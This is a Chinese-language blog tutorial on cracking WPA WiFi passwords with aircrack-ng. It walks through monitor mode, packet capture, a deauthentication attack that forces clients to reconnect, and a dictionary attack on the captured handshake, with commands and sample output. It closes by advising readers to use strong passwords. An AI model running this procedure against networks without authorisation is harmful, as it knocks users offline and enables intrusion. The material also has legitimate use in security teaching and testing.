---  
layout: post  
author: chenglong  
title: 使用aircrack破解WiFi密码
categories: [wifi, sercurity]
description: using aircrack to crack the WPA passwd of wifi
keywords: wifi, wpa, aircrack, sniffer
---  

Aircrack-ng是一组用于wifi探测，抓包以及破解的工具集合。WPA是目前主要的wifi身份认证的方式，利用aircrack工具我们可以有效地探测到当前网络中的ap和station信息，并诱导抓取WPA的4次握手认证报文，从而利用字典方式进行破解。

> ==声明== : 本文仅用于研究用途！

<!-- abs -->

# 0 准备工作

在破解前需要以下准备工作：

- 一台linux机器
- 一个可以进入monitor mode的wifi网卡，由于同一个网卡在抓包过程中无法同时使用ip网络，因此为了方便最好单独准备一个usb wifi网卡用于抓包
- 安装aircrack-ng工具
- 进行packet-injection(包注入)测试，确定网卡可用并确认抓包范围

对于工具安装过程在ubuntu下执行`sudo apt-get install aircrack-ng`即可，其他发行版本自行查找源下载方式，或者下载源码编译。

这里对选取合适wifi网卡和packet-injection测试做一个说明

## 0.1 选取wifi抓包网卡

正常情况下wifi网卡是无法直接抓取空口报文的，需要进入monitor模式才可以，而monitor模式功能由wifi网卡的firmware控制，很多wifi网卡厂商出于各种原因是没有提供这种模式的，对于这类网卡有的可以通过重新烧写自定义的firmware实现功能，例如树莓派上的博通网卡在github上就有一个可用的开源firmware版本nexmon。简单的方法就是选取本身支持该模式的usb网卡进行测试。

把usb wifi网卡插入后，输入`lsusb` 找到对应的设备，其中`ID xxxx:xxxx`代表了设备的芯片id号，将这个id号在谷歌搜索即可得到具体的芯片型号，这样就可以确认该芯片是否支持monitor mode。

如果设备正常驱动就绪的话，输入`iw dev`即可看到新插入的wifi网卡

常见的可用wifi网卡型号如下，可以直接购买以下列表的网卡进行测试：

- Atheros AR9271
- Ralink RT3070
- Ralink RT3572
- Realtek 8287L
- Realtek RTL8812AU

## 0.2 paket-injection 测试

首先将wifi网卡进入monitor mode：

```
airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  428 NetworkManager
  522 dhclient
  718 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rt2800usb	Ralink Technology, Corp. RT5372

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)
```

其中wlan0为通过`iw dev`或者`ifconfig`方式获取的网卡名称,如果出现上图输出则进入monitor模式成功,注意当进入monitormode后网卡名称往往会发生改变，例如改变为`wlan0mon`

接着执行packet-injection测试：
```
aireplay-ng --test wlan0mon

12:47:05  Waiting for beacon frame (BSSID: AA:BB:CC:DD:EE) on channel 7
12:47:05  Trying broadcast probe requests...
12:47:06  Injection is working!
12:47:07  Found 1 AP

12:47:07  Trying directed probe requests...
12:47:07  AA:BB:CC:DD:EE - channel: 7 - 'Dobis'
12:47:08  Ping (min/avg/max): 0.891ms/15.899ms/32.832ms Power: -21.72
12:47:08  29/30:  96%
```
这里会探测附近的所有ap，并对每个ap逐个发送单播probe请求并检查响应，上面`12:47:08 29/30 96%`代表发送了30个单播请求，收到了29个响应，成功率为96%，因为网卡和ap的网络覆盖范围不同，例如会出现能够收到ap报文但发送的报文无法送达ap的情况，这一步的用于确认当前环境的攻击范围

# 1 抓取空口报文

执行`airodump-ng -c 11 --bssid xx:xx:xx:xx:xx -w out.cap wlan0mon` ,其中各参数含义如下：

- `-c` 代表选择11信道
- `--bssid` 选择过滤的bssid，这里就是ap的mac地址
- `-w out.cap` 将抓包信息保存到文件
- `wlan0mon` 选择网卡

执行后可以看到如下抓包信息：
```
  CH  9 ][ Elapsed: 4 s ][ 2007-03-24 16:58 ][ WPA handshake: 00:14:6C:7E:40:80
                                                                                                               
  BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
                                                                                                               
  00:14:6C:7E:40:80   39 100       51      116   14   9  54  WPA2 CCMP   PSK  teddy                           
                                                                                                               
  BSSID              STATION            PWR  Lost  Packets  Probes                                             
                                                                                                               
  00:14:6C:7E:40:80  00:0F:B5:FD:FB:C2   35     0      116  
```
位于上方的为ap，下方为连接到ap的station信息

# 2 执行deauthentication攻击促使station断链

用于破解WPA的4路握手报文，仅在station开始连接的时候才会出现，因此如果只是被动等待抓包很可能一直都抓取不到。因此这里需要主动促使station发生短连然后再抓取其重连时产生的4路握手报文。注意在整个过程中始终要保持上一步的抓包进行处于执行中。

`aireplay-ng -0 1 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0mon`

其中`-0`代表发动deauthentication攻击，1代表发生一次攻击，-a为bssid，即ap的mac地址，-c为对应的station的mac地址，当发动攻击成功后，station会暂时短连并很快重新连接，同时在上一步的抓包中会产生一个`EAPOL`提示则代表抓取成功。

# 3 利用字典执行破解

`aircrack-ng -w passwd.lst -b xx:xx:xx:xx:xx:xx psk.cap`

passwd.lst为破解字典，-b为指定的bssid即ap mac地址，psk.cap为上一步中抓取的包含WPA 4路握手报文的抓包文件。如果破解成功，则会出现如下提示：

```
                               Aircrack-ng 0.8
 
 
                 [00:00:00] 2 keys tested (37.20 k/s)
 
 
                         KEY FOUND! [ 12345678 ]
 
 
    Master Key     : CD 69 0D 11 8E AC AA C5 C5 EC BB 59 85 7D 49 3E 
                     B8 A6 13 C5 4A 72 82 38 ED C3 7E 2C 59 5E AB FD 
 
    Transcient Key : 06 F8 BB F3 B1 55 AE EE 1F 66 AE 51 1F F8 12 98 
                     CE 8A 9D A0 FC ED A6 DE 70 84 BA 90 83 7E CD 40 
                     FF 1D 41 E1 65 17 93 0E 64 32 BF 25 50 D5 4A 5E 
                     2B 20 90 8C EA 32 15 A6 26 62 93 27 66 66 E0 71 
 
    EAPOL HMAC     : 4E 27 D9 5B 00 91 53 57 88 9C 66 C8 B1 29 D1 CB 
```

到这里wpa的破解就完成了。

# 总结

看起来是不是很简单？但可惜的是实际上wpa的破解并没有这么简单：) 原因就在于这种方式的破解实际是一种暴力破解方式，仅对于非常简单的密码会有效果，假如密码是`*Abda23J2*`这种的话，用这种方法几乎是无法破解的，破解需要的时间会远远超过实际可能。但如果结合社会工程学缩小范围得到一个较为良好的字典，还是有可能破解的。因此在平时注意不要设置过于简单的密码，只要数字字母符号简单的结合就能让这类攻击方法失效。

> ref
[wpa crack](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)
